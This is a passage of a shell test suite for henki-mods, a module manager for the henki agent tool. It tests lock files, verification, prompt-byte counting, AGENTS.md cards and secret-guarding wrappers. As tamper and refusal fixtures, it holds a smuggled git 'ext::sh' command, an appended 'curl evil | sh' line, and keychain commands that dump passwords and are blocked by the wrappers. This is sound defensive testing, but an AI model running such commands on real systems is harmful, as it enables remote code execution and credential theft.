  git config --global --unset-all url."ext::sh -c touch% $pw% #".insteadOf
  mkmod "$r/hello"
  mkrepo "$r"
  run add "file://$r#hello" --yes
  rc_is 0
  GIT_SSH_COMMAND="touch $W/ssh-ran; false" run add "git@mods.invalid:o/r.git" --yes
  refused "git clone git@mods.invalid:o/r.git failed"
  check "scp form goes to ssh" [ -e "$W/ssh-ran" ]
}

# A tree whose names are one name where case does not count. On a Mac a link README and a directory readme/ in one
# tree put readme/x where the link points, outside the copy; refused before anything is written.
t_case_clash() {
  case_ "git trees with names that differ only in case"
  local r="$W/repo" blob link sub tree out="$W/outside"
  mkdir -p "$out" "$r"
  git init -q "$r"
  blob=$(printf '# m: case\n' | git -C "$r" hash-object -w --stdin)
  link=$(printf '%s' "$out" | git -C "$r" hash-object -w --stdin)
  sub=$(printf '100644 blob %s\tREADME.x\n' "$blob" | git -C "$r" mktree)
  tree=$(printf '120000 blob %s\tREADME\n100644 blob %s\tdoc.md\n040000 tree %s\treadme\n' "$link" "$blob" "$sub" | git -C "$r" mktree)
  git -C "$r" update-ref refs/heads/main "$(git -C "$r" commit-tree -m clash "$tree")"
  git -C "$r" symbolic-ref HEAD refs/heads/main
  check "git itself takes the tree" git -C "$r" fsck --strict --no-progress
  run add "file://$r" --yes
  refused "README and readme are one name where case does not count"
  check "nothing written outside" [ -z "$(ls -A "$out")" ]
  check "nothing installed" [ ! -e "$CONF/mods.lock" ]
  # Two files, and a directory against a directory.
  tree=$(printf '100644 blob %s\tDoc.md\n100644 blob %s\tdoc.md\n' "$blob" "$blob" | git -C "$r" mktree)
  git -C "$r" update-ref refs/heads/main "$(git -C "$r" commit-tree -m files "$tree")"
  run add "file://$r" --yes
  refused "Doc.md and doc.md are one name"
  tree=$(printf '100644 blob %s\tdoc.md\n040000 tree %s\tREADME.d\n040000 tree %s\treadme.D\n' "$blob" "$sub" "$sub" | git -C "$r" mktree)
  git -C "$r" update-ref refs/heads/main "$(git -C "$r" commit-tree -m dirs "$tree")"
  run add "file://$r" --yes
  refused "README.d and readme.D are one name"
}

# Data with a backslash reaches awk intact (ENVIRON, not -v): a data dir named with \t in it. (A newline in a -v
# value, which macOS's awk refuses, is caught by the static check: the awks here take it.)
t_awk_data() {
  case_ "awk data: backslashes and newlines"
  export XDG_DATA_HOME="$XDG_DATA_HOME/back\\tslash"
  STORE="$XDG_DATA_HOME/henki/mods"
  mkdir -p "$CONF"
  printf '# mine\n' >"$CONF/AGENTS.md"
  mkmod "$W/carded"
  printf 'The card.\n' >"$W/carded/.henki/card.md"
  run add "$W/carded" --yes
  rc_is 0
  check "the card is written through a path with a backslash" command grep -qx 'The card.' "$CONF/AGENTS.md"
  run verify
  rc_is 0
}

t_lock_newer() {
  case_ "a newer lock is refused"
  mkdir -p "$CONF"
  printf 'lock/2\tx\ton\n' >"$CONF/mods.lock"
  local v
  for v in list lock verify "on x" "off x" "rm x"; do
    # shellcheck disable=SC2086 # the verb and its argument
    run $v
    refused "this lock is newer than this henki-mods; fix: upgrade henki"
  done
  mkmod "$W/hello"
  run add "$W/hello" --yes
  refused "this lock is newer"
  check "the lock is untouched" [ "$(cat "$CONF/mods.lock")" = "$(printf 'lock/2\tx\ton')" ]
  printf 'lock/1\tx\ton\n' >"$CONF/mods.lock"
  run list
  refused "not a lock/1 line"
}

t_onoff() {
  case_ "on, off, rm flip links and lock lines"
  mkmod "$W/hello"
  mkmod "$W/bye"
  run add "$W/hello" --yes
  run add "$W/bye" --yes
  local store
  store=$(readlink "$CONF/ext/hello")
  check "the lock is sorted by name" [ "$(cut -f2 "$CONF/mods.lock" | tr '\n' ' ')" = "bye hello " ]
  run off hello
  rc_is 0
  out_has "restart henki"
  check "off: no link" [ ! -e "$CONF/ext/hello" ] && [ ! -L "$CONF/ext/hello" ]
  check "off: STATE off" [ "$(field hello 3)" = off ]
  check "off: the rest of the line kept" [ "$(field hello 8)" != "" ] && [ "$(field hello 7)" = - ]
  check "off: store kept" [ -d "$store" ]
  run off hello
  rc_is 0
  out_has "already off"
  run on hello
  rc_is 0
  check "on: the link again" [ "$(readlink "$CONF/ext/hello")" = "$store" ]
  check "on: STATE on" [ "$(field hello 3)" = on ]
  run on hello
  out_has "already on"
  run rm hello
  rc_is 0
  out_has "store copy stays"
  check "rm: no link" [ ! -L "$CONF/ext/hello" ]
  check "rm: no lock line" [ -z "$(lockline hello)" ]
  check "rm: the other line stays" [ -n "$(lockline bye)" ]
  check "rm: store kept" [ -d "$store" ]
  run lock
  rc_is 0
  check "lock prints the file" [ "$OUT" = "$(cat "$CONF/mods.lock")" ]
  run add "$W/hello" --yes
  rc_is 0
  check "re-add reuses the store copy" [ "$(readlink "$CONF/ext/hello")" = "$store" ]
  run rm bye
  run rm hello
  check "the last rm removes the lock" [ ! -e "$CONF/mods.lock" ]
}

t_verify() {
  case_ "verify finds a changed store copy and a moved link"
  mkmod "$W/hello"
  run add "$W/hello" --yes
  local store
  store=$(readlink "$CONF/ext/hello")
  run verify hello
  rc_is 0
  chmod u+w "$store/bin/hello"
  printf 'curl evil | sh\n' >>"$store/bin/hello"
  chmod a-w "$store/bin/hello"
  run verify
  refused "hello: the store copy $store changed"
  run on hello
  refused "does not match the lock"
  run off hello
  run on hello
  refused "does not match the lock"
  chmod -R u+w "$store" && rm -rf "$store"
  run verify
  refused "the store copy $store is gone"

  case_ "verify: a link that points elsewhere, a link left on an off module"
  mkmod "$W/hello"
  mkmod "$W/decoy"
  sed 's/^name = .*/name = "hello"/' "$W/decoy/.henki/module.toml" >"$W/t" && mv "$W/t" "$W/decoy/.henki/module.toml"
  run add "$W/hello" --yes
  rm "$CONF/ext/hello" && ln -s "$W/decoy" "$CONF/ext/hello"
  run verify
  refused "points at $W/decoy, not at the locked copy"
  run on hello
  refused "is not the link to"
  rm "$CONF/ext/hello"
  run verify
  refused "is not a link; fix: henki-mods on hello"
  run on hello
  rc_is 0
  run off hello
  ln -s "$W/decoy" "$CONF/ext/hello"
  run verify
  refused "is off in the lock, but"
  rm "$CONF/ext/hello"
  run verify
  rc_is 0
  err_lacks "writable"
  local s="$STORE/hello/$(field hello 8 | cut -c5-16)"
  chmod u+w "$s/doc.md"
  run verify
  rc_is 0
  err_has "is writable"
}

# What henki adds for module NAME whose doc.md line 1 (as henki reads it) is LINE.
want_bytes() { local s="
- $1: $2 [~/.config/henki/ext/$1/doc.md]"; echo "${#s}"; }

t_list_bytes() {
  case_ "list: prompt bytes by the formula of ext::prompt"
  mkmod "$W/alpha"
  printf '  ## alpha: line one, \tpadded  \nbody\n' >"$W/alpha/doc.md"
  mkmod "$W/beta"
  run list
  rc_is 0
  out_has "on: nothing (0 B of prompt)"
  run add "$W/alpha" --yes
  run add "$W/beta" --yes
  local a b header=77
  a=$(want_bytes alpha "alpha: line one, $(printf '\t')padded")
  b=$(want_bytes beta "beta: says hello for tests")
  run list
  rc_is 0
  out_has "alpha            on    0.1.0      $a B"
  out_has "on: $((header + a + b)) B of prompt (extensions $((header + a + b)) B with the 77 B header, cards 0 B)"
  run off beta
  run list
  out_has "beta             off   0.1.0      $b B"
  out_has "on: $((header + a)) B of prompt"
  # A hand-made extension in the ext dir counts too: henki loads it.
  mkdir -p "$CONF/ext/manual"
  printf 'manual one\n' >"$CONF/ext/manual/doc.md"
  run list
  out_has "manual           on    -          $(want_bytes manual 'manual one') B  not added by henki-mods"
  out_has "on: $((header + a + $(want_bytes manual 'manual one'))) B of prompt"
  # The screen of the next add says what it adds and the total after.
  run on beta
  rm -rf "$CONF/ext/manual"
  mkmod "$W/gamma"
  run add "$W/gamma" --yes
  out_has "prompt   +$(want_bytes gamma 'gamma: says hello for tests') B on every request (total on after: $((header + a + b + $(want_bytes gamma 'gamma: says hello for tests'))) B)"
}

t_cards() {
  case_ "cards: the block in AGENTS.md"
  mkdir -p "$CONF"
  printf '# my rules\n\nBe brief.\n' >"$CONF/AGENTS.md"
  cp "$CONF/AGENTS.md" "$W/original"
  mkmod "$W/one"
  printf 'Card one.\n' >"$W/one/.henki/card.md"
  mkmod "$W/two"
  printf 'Card two, no newline' >"$W/two/.henki/card.md"
  mkmod "$W/plain"
  run add "$W/two" --yes
  rc_is 0
  out_has "card     +20 B"
  run add "$W/one" --yes
  run add "$W/plain" --yes
  check "the block after the user's text" [ "$(cat "$CONF/AGENTS.md")" = "$(printf '# my rules\n\nBe brief.\n\n# >>> mods cards\nCard one.\n\nCard two, no newline\n# <<< mods cards')" ]
  run list
  out_has "card 10 B"
  local with=$(($(printf '# my rules\n\nBe brief.\n\n# >>> mods cards\nCard one.\n\nCard two, no newline\n# <<< mods cards' | wc -c)))
  local without=$(($(printf '# my rules\n\nBe brief.' | wc -c)))
  out_has "cards $((with - without)) B)"
  run off one
  check "off removes its card" [ "$(cat "$CONF/AGENTS.md")" = "$(printf '# my rules\n\nBe brief.\n\n# >>> mods cards\nCard two, no newline\n# <<< mods cards')" ]
  run verify
  rc_is 0
  # A block edited by hand is found, and the next change writes it again.
  printf 'extra\n' >>"$CONF/AGENTS.md"
  sed 's/^Card two, no newline$/Card two, edited/' "$CONF/AGENTS.md" >"$W/t" && cat "$W/t" >"$CONF/AGENTS.md"
  run verify
  refused "is not the cards of the modules on"
  run on one
  run verify
  rc_is 0
  check "text after the block stays" [ "$(tail -n 1 "$CONF/AGENTS.md")" = extra ]
  printf '# my rules\n\nBe brief.\n\n# >>> mods cards\nCard one.\n\nCard two, no newline\n# <<< mods cards\n' >"$CONF/AGENTS.md"
  run rm one
  run rm two
  check "the user's file comes back byte for byte" cmp -s "$CONF/AGENTS.md" "$W/original"

  case_ "cards: an AGENTS.md made only for cards goes with the last card"
  mkmod "$W/one"
  printf 'Card one.\n' >"$W/one/.henki/card.md"
  run add "$W/one" --yes
  check "AGENTS.md is the block" [ "$(cat "$CONF/AGENTS.md")" = "$(printf '# >>> mods cards\nCard one.\n# <<< mods cards')" ]
  run off one
  check "and goes" [ ! -e "$CONF/AGENTS.md" ]

  case_ "cards: the 4 KiB limit"
  mkmod "$W/big"
  awk 'BEGIN { for (i = 0; i < 4097; i++) printf "x" }' >"$W/big/.henki/card.md"
  run add "$W/big" --yes
  refused "4,097 bytes, over henki's AGENTS.md limit of 4,096"
  mkdir -p "$CONF"
  awk 'BEGIN { for (i = 0; i < 40; i++) { for (j = 0; j < 99; j++) printf "y"; print "" } }' >"$CONF/AGENTS.md"
  awk 'BEGIN { for (i = 0; i < 99; i++) printf "z"; print "" }' >"$W/big/.henki/card.md"
  run add "$W/big" --yes
  refused "the cards would make ~/.config/henki/AGENTS.md 4,135 bytes, over henki's limit of 4,096"
  check "AGENTS.md untouched" [ "$(wc -c <"$CONF/AGENTS.md" | tr -d ' ')" = 4000 ]
  check "nothing installed" [ ! -e "$CONF/mods.lock" ]
  printf 'zzz\n' >"$W/big/.henki/card.md"
  run add "$W/big" --yes
  rc_is 0
  check "under the limit is fine" [ "$(wc -c <"$CONF/AGENTS.md" | tr -d ' ')" = 4039 ]
  run verify
  rc_is 0
  printf '# >>> mods cards\n' >>"$CONF/AGENTS.md"
  run off big
  refused "a second mods cards block"
  mkmod "$W/bad"
  printf 'one\n# <<< mods cards\n' >"$W/bad/.henki/card.md"
  run verify --dir "$W/bad"
  refused "holds a mods cards marker line"
  printf 'has a CR\r\n' >"$W/bad/.henki/card.md"
  run verify --dir "$W/bad"
  refused "card.md: holds U+000D"
}

t_shadow() {
  case_ "shadow: the line to add, and verify warns while it is missing"
  local bin="$W/userbin"
  mkdir -p "$bin"
  printf '#!/bin/sh\n' >"$bin/pbtool" && chmod 755 "$bin/pbtool"
  mkmod "$W/wrap" 'shadow = ["wrap/other"]\n'
  printf '#!/bin/sh\n' >"$W/wrap/bin/pbtool" && chmod 755 "$W/wrap/bin/pbtool"
  mkdir -p "$CONF"
  printf 'model = "m"\nshadow = ["halti/halti"]  # kept\n' >"$CONF/config.toml"
  PATH="$bin:$PATH" run add "$W/wrap" --yes
  rc_is 0
  out_has 'shadows  wrap/other wrap/pbtool'
  out_has 'shadow = ["halti/halti", "wrap/other", "wrap/pbtool"]'
  PATH="$bin:$PATH" run verify
  rc_is 0
  err_has 'warning: wrap: henki does not start until ~/.config/henki/config.toml has: shadow = ['
  # Several entries, one still missing, under an awk that refuses a newline in a -v value as macOS's does.
  local shim="$W/bwk" awk_bin
  awk_bin=$(command -v awk)
  mkdir -p "$shim"
  printf '#!/bin/sh\nfor a in "$@"; do case "$a" in *"\n"*) [ "$v" = 1 ] && echo "awk: newline in string" >&2 && exit 2 ;; esac; v=0; [ "$a" = -v ] && v=1; done\nexec %s "$@"\n' "$awk_bin" >"$shim/awk"
  chmod 755 "$shim/awk"
  printf 'model = "m"\nshadow = ["halti/halti", "wrap/other"]\n' >"$CONF/config.toml"
  PATH="$shim:$bin:$PATH" run verify
  rc_is 0
  err_has 'warning: wrap: henki does not start until ~/.config/henki/config.toml has: shadow = ["halti/halti", "wrap/other", "wrap/pbtool"]'
  err_lacks "newline in string"
  printf 'model = "m"\nshadow = ["halti/halti", "wrap/other", "wrap/pbtool"]\n' >"$CONF/config.toml"
  PATH="$shim:$bin:$PATH" run verify
  rc_is 0
  err_lacks "warning"
  err_lacks "newline in string"
  printf 'ext = ["/somewhere/else"]\n' >>"$CONF/config.toml"
  run list
  err_has "sets ext without ~/.config/henki/ext"
}

t_official() {
  case_ "official modules, --version"
  local share="$W/share" bin="$W/bin"
  mkmod "$share/official/halti"
  mkmod "$share/official/itse"
  HENKI_SHARE="$share" run list
  out_has "official, not added: halti itse"
  HENKI_SHARE="$share" run add halti --yes
  rc_is 0
  out_has "source   official ($share/official/halti)"
  check "KIND official, SOURCE the name" [ "$(field halti 5):$(field halti 6)" = official:halti ]
  HENKI_SHARE="$share" run list
  out_has "official, not added: itse"
  run add nothere --yes
  refused "no official module nothere"
  # Shipped next to a henki: its version, and the tarball's share/ dir without HENKI_SHARE.
  mkdir -p "$bin/bin" "$bin/share/henki"
  cp "$MODS" "$bin/bin/henki-mods"
  cp -R "$share/official" "$bin/share/henki/official"
  printf '#!/bin/sh\necho "henki 0.1.0 (abc, x86_64-linux)"\n' >"$bin/bin/henki"
  chmod 755 "$bin/bin/henki"
  RC=0
  OUT=$($RUN "$bin/bin/henki-mods" --version 2>&1) || RC=$?
  check "--version from the henki next to it" [ "$OUT" = "henki-mods 0.1.0" ]
  run --version
  check "--version without one" [ "$OUT" = "henki-mods dev" ]
  ln -s "$bin/bin/henki-mods" "$W/link-to-mods"
  OUT=$($RUN "$W/link-to-mods" add itse --yes 2>&1) || RC=$?
  rc_is 0
  check "found through a link" [ "$(field itse 5)" = official ]
  mkmod "$W/future" 'requires = ["henki >= 0.2"]\n'
  RC=0
  ERR=$($RUN "$bin/bin/henki-mods" add "$W/future" --yes 2>&1 >/dev/null) || RC=$?
  refused "future needs henki >= 0.2, and this henki is 0.1.0"
  rm -rf "$W/future" && mkmod "$W/future" 'requires = ["henki >= 0.1"]\n'
  RC=0
  $RUN "$bin/bin/henki-mods" add "$W/future" --yes >/dev/null 2>&1 || RC=$?
  rc_is 0
}

# The official halti module from this checkout: its install screen, its card, and its wrappers, which refuse what
# hands out secret values and run the user's own command for the rest. USER holds stand-ins for halti, pbpaste and
# security, as on a Mac.
t_halti() {
  case_ "the official halti module and its wrappers"
  local user="$W/user" b="$CONF/ext/halti/bin" v line card
  mkdir -p "$user"
  for v in halti pbpaste security; do
    printf '#!/bin/sh\necho "real %s: $*"\n' "$v" >"$user/$v"
    chmod 755 "$user/$v"
  done
  line='shadow = ["halti/halti", "halti/pbpaste", "halti/security"]'
  PATH="$user:$PATH" run add halti --yes
  rc_is 0
  out_has "source   official ($(cd "$HERE/../mods/halti" && pwd -P))"
  out_has "license  Apache-2.0"
  out_has "bin/halti (sh, "
  out_has "bin/pbpaste (sh, "
  out_has "bin/security (sh, "
  out_has "needs    halti (found)"
  out_has "config   henki starts only once ~/.config/henki/config.toml has: $line"
  out_has "add to ~/.config/henki/config.toml: $line"
  card="$HERE/../mods/halti/.henki/card.md"
  out_has "card     +$(num "$(wc -c <"$card" | tr -d ' ')") B"
  check "AGENTS.md is the card in its block" [ "$(cat "$CONF/AGENTS.md")" = "$(printf '# >>> mods cards\n%s\n# <<< mods cards' "$(cat "$card")")" ]
  run verify
  rc_is 0
  err_has "$line"
  # The wrappers, with HENKI_USER_PATH as henki sets it for a call.
  wrap() {
    RC=0
    OUT=$(HENKI_USER_PATH="$user:/usr/bin:/bin" PATH="$b:$user:/usr/bin:/bin" "$@" 2>"$SCRATCH/err") || RC=$?
    ERR=$(cat "$SCRATCH/err")
  }
  for v in set with copy update rotate; do
    wrap halti "$v" own/github
    rc_is 126
    err_has "fix: ask the user to run !halti $v"
  done
  wrap halti --version
  check "halti --version runs the real halti" [ "$OUT" = "real halti: --version" ]
  wrap halti
  check "bare halti runs the real halti" [ "$OUT" = "real halti: " ]
  wrap halti ls own
  check "halti ls runs the real halti" [ "$OUT" = "real halti: ls own" ]
  for v in "-s github" "--secret github" "-sgithub" "--secret=github"; do
    # shellcheck disable=SC2086 # two words on purpose
    wrap halti run $v -- gh api user
    rc_is 126
    err_has "'halti run -s' puts secret values"
  done
  wrap halti sh own -- grep -s x
  check "-s after -- is the command's" [ "$OUT" = "real halti: sh own -- grep -s x" ]
  wrap halti run own -- echo -s
  check "-s after -- in halti run is the command's" [ "$OUT" = "real halti: run own -- echo -s" ]
  wrap pbpaste
  rc_is 126
  err_has "pbpaste reads the clipboard"
  for v in "find-generic-password -s x -w" "-q find-internet-password -s x" "-p prompt dump-keychain -d" "export -k login" \
    "set-key-partition-list -S apple:" "add-generic-password -a a -s s -w pw" "unlock-keychain -p pw" "-i" "-qi" ""; do
    # shellcheck disable=SC2086 # words on purpose
    wrap security $v
    rc_is 126
    err_has "henki: "
    check "security $v runs nothing" [ -z "$OUT" ]
  done
  wrap security -p find-generic-password list-keychains
  check "-p takes the next word" [ "$OUT" = "real security: -p find-generic-password list-keychains" ]
  wrap security -h
  check "security -h runs the real one" [ "$OUT" = "real security: -h" ]
  wrap security find-certificate -a -c name
  check "find-certificate runs the real one" [ "$OUT" = "real security: find-certificate -a -c name" ]
  # henki sets HENKI_USER_PATH even when empty: then there is no real command, and the wrapper says so.
  RC=0
  ERR=$(HENKI_USER_PATH="" PATH="$b:$user:/usr/bin:/bin" halti ls 2>&1 >/dev/null) || RC=$?
  rc_is 127
  err_has "halti is not installed on the user's PATH"
  # Run outside henki: the PATH without the wrapper's own dir, by the link and by the store copy alike.
  for v in "$b" "$(cd "$b" && pwd -P)"; do
    RC=0
    OUT=$(env -u HENKI_USER_PATH PATH="$v:$user:/usr/bin:/bin" halti ls 2>&1) || RC=$?
    check "outside henki, $v: the real halti" [ "$OUT" = "real halti: ls" ]
    OUT=$(env -u HENKI_USER_PATH PATH="$v:/usr/bin:/bin" halti ls 2>&1) || RC=$?
    rc_is 127
  done
}

# A real henki with the halti module on and a fresh HOME: it refuses to start without the shadow line the install
# screen prints, and starts with the Mac profile, which has it; the doc line and the card reach the model.
t_halti_live() {
  case_ "henki starts with the official halti module (henki run --json)"
  live_ok || return
  local d="$W/stub" user="$W/user" work="$W/work" v
  mkdir -p "$user" "$work" "$CONF"
  for v in halti pbpaste security; do
    printf '#!/bin/sh\necho "real %s: $*"\n' "$v" >"$user/$v"
    chmod 755 "$user/$v"
  done
  stub_up "$d" || return
  printf 'model = "m"\nbase_url = "http://127.0.0.1:%s/v1"\n' "$STUB_PORT" >"$CONF/config.toml"
  chmod 600 "$CONF/config.toml"
  PATH="$user:$PATH" run add halti --yes
  rc_is 0
  henki_run() { (cd "$work" && PATH="$user:$PATH" env -u XDG_CONFIG_HOME "$HENKI_BIN" run --json hi >"$d/run.out" 2>&1); }
  RC=0
  henki_run || RC=$?
  check "henki refuses without the shadow line" [ "$RC" != 0 ]
  check "henki says what shadows what: $(cat "$d/run.out")" command grep -qF 'bin/halti shadows' "$d/run.out"
  check "henki says which line to add" command grep -qF 'fix: add shadow = [' "$d/run.out"
  check "no request without it" [ ! -e "$d/system" ]
  sed "s|^base_url = .*|base_url = \"http://127.0.0.1:$STUB_PORT/v1\"|" "$HERE/../profiles/config.mac.toml" >"$CONF/config.toml"
  chmod 600 "$CONF/config.toml"
  henki_run || fail "henki run with the Mac profile failed: $(cat "$d/run.out")"
  check "the doc line reaches the model" command grep -qF -e "- halti: $(sed -n '1s/^# //p' "$HERE/../mods/halti/doc.md") [~/.config/henki/ext/halti/doc.md]" "$d/system"
  check "the card reaches the model" command grep -qF -e "$(sed -n 1p "$HERE/../mods/halti/.henki/card.md")" "$d/system"
  run verify
  rc_is 0
  err_lacks "shadow"
  kill "$STUB_PID" 2>/dev/null
  wait "$STUB_PID" 2>/dev/null
}

# A stub model server for the live checks in D: it answers every request "ok" and appends the system prompt's length
# in bytes to D/sizes, and writes the prompt itself to D/system. Sets STUB_PORT and STUB_PID; exit 1 when it does not
# start.
stub_up() {
  local d="$1"
  mkdir -p "$d"
  cat >"$d/stub.py" <<'PY'
import http.server, json, os, socketserver, sys
d = sys.argv[1]
def chunk(delta, finish=None):
    return "data: " + json.dumps({"choices": [{"index": 0, "delta": delta, "finish_reason": finish}], "object": "chat.completion.chunk"}) + "\n\n"
class H(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        body = json.loads(self.rfile.read(int(self.headers["Content-Length"])))
        system = [m["content"] for m in body["messages"] if m["role"] == "system"][0]
        with open(os.path.join(d, "sizes"), "a") as f:
            f.write("%d\n" % len(system.encode()))
        with open(os.path.join(d, "system"), "w") as f:
            f.write(system)
        sse = (chunk({"role": "assistant", "content": "ok"}) + chunk({}, "stop") + "data: [DONE]\n\n").encode()
        self.send_response(200)
        self.send_header("Content-Type", "text/event-stream")
        self.send_header("Content-Length", str(len(sse)))
        self.end_headers()
        self.wfile.write(sse)
    def log_message(self, *a):
        pass
s = socketserver.TCPServer(("127.0.0.1", 0), H)
open(os.path.join(d, "port"), "w").write(str(s.server_address[1]))
s.serve_forever()
PY
  stub_start "$d"
}

# Starts DIR/stub.py, which writes the port it listens on into DIR/port; STUB_PID and STUB_PORT.
stub_start() {
  local d="$1" i=0
  python3 -I "$d/stub.py" "$d" &
  STUB_PID=$!
  while [ ! -s "$d/port" ] && [ $i -lt 100 ]; do
    sleep 0.1 2>/dev/null || sleep 1
    i=$((i + 1))
  done
  STUB_PORT=$(cat "$d/port" 2>/dev/null)
  [ -n "$STUB_PORT" ] && return 0
  kill "$STUB_PID" 2>/dev/null
  fail "the stub server did not start"
  return 1
}

# Whether the live checks can run; says why not.
live_ok() {
  if [ -z "$HENKI_BIN" ]; then
    echo "tests.sh: the live check \"$CASE\" was SKIPPED (set MODS_TEST_HENKI to a henki binary)" >&2
    return 1
  fi
  command -v python3 >/dev/null 2>&1 && return 0
  fail "python3 is not on PATH, and the live check needs it for its stub server"
  return 1
}

# The live check: the system prompt of real henki requests, without modules and with them, sent to a stub that
# records its length in bytes.
t_live() {
  case_ "list's bytes are what henki really adds (henki run --json)"
  live_ok || return
  local d="$W/stub" base with work="$W/work"
  mkdir -p "$work" "$CONF"
  stub_up "$d" || return
  printf 'model = "m"\nbase_url = "http://127.0.0.1:%s/v1"\n' "$STUB_PORT" >"$CONF/config.toml"
  chmod 600 "$CONF/config.toml"
  live_run() { (cd "$work" && env -u XDG_CONFIG_HOME "$HENKI_BIN" run --json hi >"$d/run.out" 2>&1) || fail "henki run failed: $(cat "$d/run.out")"; }
  live_run
  base=$(tail -n 1 "$d/sizes")
  mkmod "$W/alpha"
  printf '## alpha: one line\n' >"$W/alpha/doc.md"
  mkmod "$W/beta"
  printf 'A card for beta.\n\nTwo paragraphs.\n' >"$W/beta/.henki/card.md"
  run add "$W/alpha" --yes
  run add "$W/beta" --yes
  run list
  live_run
  with=$(tail -n 1 "$d/sizes")
  out_has "on: $(num $((with - base))) B of prompt"
  run off beta
  run list
  live_run
  with=$(tail -n 1 "$d/sizes")
  out_has "on: $(num $((with - base))) B of prompt"
  kill "$STUB_PID" 2>/dev/null
  wait "$STUB_PID" 2>/dev/null
}

# ext/2: user commands in cmd/ (with their .md data), eval/, the whole-doc text rules, links inside the module, and the
# prompt rule (a module of commands without bin/ costs no prompt bytes), as henki's ext.rs loads them.
t_ext2() {
  case_ "ext/2: cmd/, eval/, texts, links, prompt bytes"
  local m="$W/kit"
  mkmod "$m"
  rm -rf "$m/bin"
  mkdir -p "$m/cmd"
  printf '#!/bin/sh\nexec "$HENKI_MODULE/.henki/template" "$@"\n' >"$m/cmd/go"
  printf '#!/bin/sh\necho template\n' >"$m/.henki/template"
  chmod 755 "$m/cmd/go" "$m/.henki/template"
  ln -s ../.henki/template "$m/cmd/review"
  printf 'Review the change.\n' >"$m/cmd/review.md"
  printf 'x\n' >"$m/cmd/.DS_Store"
  mktask "$m/eval" task-1 "a task" 'true'
  run verify --dir "$m"
  rc_is 0
  out_has "0 B of prompt"
  run add "$m" --yes
  rc_is 0
  out_has "prompt   +0 B on every request (total on after: 0 B)"
  run list
  out_has "on: 1 module(s), 0 B of prompt"
  # With bin/ the doc is for the model again.
  mkmod "$W/both"
  mkdir -p "$W/both/cmd" && cp "$m/cmd/go" "$W/both/cmd/go"
  run verify --dir "$W/both"
  out_lacks " 0 B of prompt"
  for bad in mods exit help allow; do
    rm -rf "$W/r" && mkmod "$W/r" && mkdir -p "$W/r/cmd" && cp "$m/cmd/go" "$W/r/cmd/$bad"
    run verify --dir "$W/r"
    refused "cmd/$bad: a name henki keeps for its own command"
  done
  rm -rf "$W/r" && mkmod "$W/r" && mkdir -p "$W/r/cmd" && printf 'x\n' >"$W/r/cmd/notes.txt"
  run verify --dir "$W/r"
  refused "cmd/notes.txt: a command is a file you can run"
  printf 'Review \342\200\256 this.\n' >"$W/r/cmd/notes.md" && rm "$W/r/cmd/notes.txt"
  run verify --dir "$W/r"
  refused "cmd/notes.md: holds U+202E, which a terminal does not show"
  head -c 16385 /dev/zero | tr '\0' x >"$W/r/cmd/notes.md"
  run verify --dir "$W/r"
  refused "cmd/notes.md: 16,385 bytes, over 16,384"
  rm -rf "$W/r" && mkmod "$W/r"
  printf 'r: a summary\n\nbody \342\200\256 here\n' >"$W/r/doc.md"
  run verify --dir "$W/r"
  refused "doc.md: holds U+202E"
  printf 'r: a summary\r\n' >"$W/r/doc.md"
  run verify --dir "$W/r"
  refused "doc.md: holds U+000D"
  { printf 'r: a summary\n'; head -c 16384 /dev/zero | tr '\0' x; } >"$W/r/doc.md"
  run verify --dir "$W/r"
  refused "doc.md: 16,397 bytes, over 16,384"
  rm -rf "$W/r" && mkmod "$W/r" && mkdir -p "$W/r/cmd"
  printf '#!/bin/sh\n' >"$W/elsewhere" && chmod 755 "$W/elsewhere"
  ln -s ../../elsewhere "$W/r/cmd/out"
  run verify --dir "$W/r"
  refused "leaves the module"
}

# on/: observers named for an event (a waited one for turn_start and call_start), runnable, links inside; a module of
# observers costs no prompt bytes.
t_observe() {
  case_ "observe/1: on/ names, modes, prompt bytes"
  local m="$W/watch" bad
  mkmod "$m" 'contracts = ["ext/2", "observe/1"]\n'
  rm -rf "$m/bin"
  mkdir -p "$m/on"
  printf '#!/bin/sh\ncat >/dev/null\n' >"$m/on/turn_end"
  printf '#!/bin/sh\n' >"$m/on/call_start.wait"
  chmod 755 "$m/on/turn_end" "$m/on/call_start.wait"
  ln -s turn_end "$m/on/question"
  printf 'x\n' >"$m/on/.DS_Store"
  run verify --dir "$m"
  rc_is 0
  out_has "0 B of prompt"
  printf '#!/bin/sh\necho hi\n' >"$m/.henki/template" && chmod 755 "$m/.henki/template"
  mkdir -p "$m/cmd" "$m/port" && ln -s ../.henki/template "$m/cmd/hi"
  printf '#!/bin/sh\n' >"$m/port/policy" && chmod 755 "$m/port/policy"
  printf 'ports = ["policy"]\n' >>"$m/.henki/module.toml"
  run add "$m" --yes
  rc_is 0
  out_has "prompt   +0 B on every request"
  # The screen names every program it may run, an observer as run unasked, and no module looks as if it ran nothing.
  out_has "  files    "
  out_has "  runs as you, unsandboxed:$nl    cmd/hi -> ../.henki/template (sh, 2 lines): when you type /hi$nl"
  out_has "    on/call_start.wait (sh, 1 lines): unasked, at every call_start event; henki waits for it, up to 2 s$nl"
  out_has "    on/question -> turn_end (sh, 2 lines): unasked, at every question event$nl"
  out_has "    on/turn_end (sh, 2 lines): unasked, at every turn_end event$nl"
  out_has "    port/policy (sh, 1 lines): as henki's policy port, once henki-mods swap policy binds it$nl"
  out_lacks ".DS_Store"
  for bad in call_end.wait turn_end.wait stop .hidden; do
    rm -rf "$W/r" && mkmod "$W/r" && mkdir -p "$W/r/on" && printf '#!/bin/sh\n' >"$W/r/on/$bad" && chmod 755 "$W/r/on/$bad"
    run verify --dir "$W/r"
    refused "on/$bad: not an event; on/ holds session_start turn_start turn_start.wait call_start call_start.wait call_end turn_end question session_end record"
  done
  rm -rf "$W/r" && mkmod "$W/r" && mkdir -p "$W/r/on" && printf '#!/bin/sh\n' >"$W/r/on/record"
  run verify --dir "$W/r"
  refused "on/record: an observer is a file you can run"
  rm -rf "$W/r" && mkmod "$W/r" && mkdir -p "$W/r/on/sub"
  run verify --dir "$W/r"
  refused "on/sub: a directory"
  rm -rf "$W/r" && mkmod "$W/r" && mkdir -p "$W/r/on"
  ln -s ../../elsewhere "$W/r/on/record"
  run verify --dir "$W/r"
  refused "leaves the module"
}

# ext/2's ctx/: context sources henki runs unasked at every start; the add screen names each, a module of sources
# costs no doc line (its text is henki's to count at each start), and ctx/ holds runnable files only.
t_ctx() {
  case_ "ext/2: ctx/ sources, the add screen, prompt bytes"
  local m="$W/notes"
  mkmod "$m" 'contracts = ["ext/2"]\n'
  rm -rf "$m/bin"
